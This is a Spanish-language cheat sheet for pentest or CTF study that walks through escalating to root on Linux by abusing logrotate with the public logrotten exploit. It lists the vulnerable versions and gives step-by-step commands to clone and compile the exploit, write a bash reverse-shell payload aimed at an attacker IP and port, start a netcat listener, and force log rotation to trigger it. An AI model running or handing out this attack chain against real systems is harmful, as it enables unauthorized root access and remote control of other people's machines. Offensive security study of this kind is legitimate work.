---
tags:
  - linux
  - privex
  - logrotate
---
## Conceptos Clave (TL;DR)
* Logrotate es una herramienta del sistema que archiva, rota y elimina archivos de log antiguos para evitar que el disco se llene.
* Funciona renombrando archivos de log antiguos, creando nuevos o vaciando los existentes de forma periódica mediante cron.
* Su configuración principal reside en `/etc/logrotate.conf`, la cual incluye configuraciones específicas por servicio almacenadas en `/etc/logrotate.d/`.

## Herramientas Clave
* **logrotate**: Utilidad del sistema objetivo responsable de gestionar y rotar los logs.
* **logrotten**: Exploit público desarrollado en C que abusa de vulnerabilidades en la rotación de logs para escalar privilegios.
* **gcc**: Compilador de C necesario para construir el binario del exploit a partir del código fuente.
* **nc (Netcat)**: Utilizado para establecer el listener a la espera de la reverse shell enviada por el payload.

## Metodología Paso a Paso
**Fase 1: Enumeración y Verificación de Requisitos**
Se debe inspeccionar el sistema objetivo para confirmar que se cumplen los criterios de vulnerabilidad. Esto implica verificar la versión de logrotate, comprobar si se tienen permisos de escritura sobre los archivos de log y leer la configuración global para identificar la directiva en uso (como `create` o `compress`). Esta información es vital porque el exploit necesita adaptarse a la configuración específica del sistema.

**Fase 2: Preparación del Exploit y Payload**
Consiste en obtener el código fuente de `logrotten` y compilarlo para crear un binario ejecutable. Posteriormente, se debe generar un archivo de texto con el payload que se desea ejecutar (por ejemplo, una reverse shell en bash). Este payload será invocado por el exploit cuando logrotate interactúe con el log vulnerado y otorgue la ejecución con privilegios elevados.

**Fase 3: Explotación y Ejecución**
Se inicia un listener en la máquina del atacante. Luego, se ejecuta el exploit compilado apuntando al payload creado y al archivo de log objetivo sobre el cual tenemos control. Finalmente, se espera a que ocurra la rotación programada o se fuerza manualmente para desencadenar el payload y recibir la conexión de root.

## Cheat Sheet de Comandos

```bash
# Muestra la ayuda y las opciones disponibles de logrotate 
logrotate --help

# Muestra la configuración global de logrotate para analizar sus directivas 
cat /etc/logrotate.conf

# Muestra el estado y la fecha de la última rotación de los diferentes logs 
cat /var/lib/logrotate.status

# Lista los archivos de configuración específicos de logs por servicio 
ls /etc/logrotate.d/

# Filtra la configuración global para identificar si usa "create" o "compress", ignorando los comentarios 
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Clona el repositorio del exploit logrotten a la máquina local 
git clone [https://github.com/whotwagner/logrotten.git](https://github.com/whotwagner/logrotten.git)

# Compila el código fuente del exploit en un binario ejecutable llamado logrotten 
gcc logrotten.c -o logrotten

# Crea el payload de reverse shell apuntando a la IP y puerto de la máquina atacante 
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' > payload

# Inicia un listener en la máquina atacante para recibir la conexión de la reverse shell 
nc -nlvp <ATTACKER_PORT>

# Ejecuta el exploit proporcionando la ruta del payload y el archivo de log objetivo 
./logrotten -p ./payload <TARGET_LOG_FILE>
```

## "Gotchas" y Troubleshooting
* **Requisitos Estrictos:** Para que la explotación sea viable, es obligatorio tener permisos de escritura en los archivos de log objetivo y que logrotate sea ejecutado por un usuario con privilegios o root.
* **Versiones Vulnerables:** El vector de ataque no es universal; está limitado a las versiones de logrotate 3.8.6, 3.11.0, 3.15.0 y 3.18.0.
* **Compilación:** Es crítico compilar el exploit (`logrotten.c`) directamente en el sistema objetivo. Si no hay herramientas de compilación en el objetivo, debe compilarse en una máquina que posea una versión de kernel similar para evitar incompatibilidades de la biblioteca en tiempo de ejecución.
* **Sincronización y Forzado:** La explotación requiere que ocurra la rotación del log. Si no se puede esperar al trabajo del cron (generalmente diario o semanal), se puede forzar modificando la fecha en el archivo de estado `/var/lib/logrotate.status` o utilizando el flag `-f` / `--force` si se tienen los permisos para ejecutar el binario.
* **Adaptación del Exploit:** Antes de lanzar el binario de explotación, se debe verificar estrictamente si la configuración de logrotate utiliza la directiva `create` o `compress`, ya que el uso del exploit debe alinearse a la función habilitada para ser efectivo.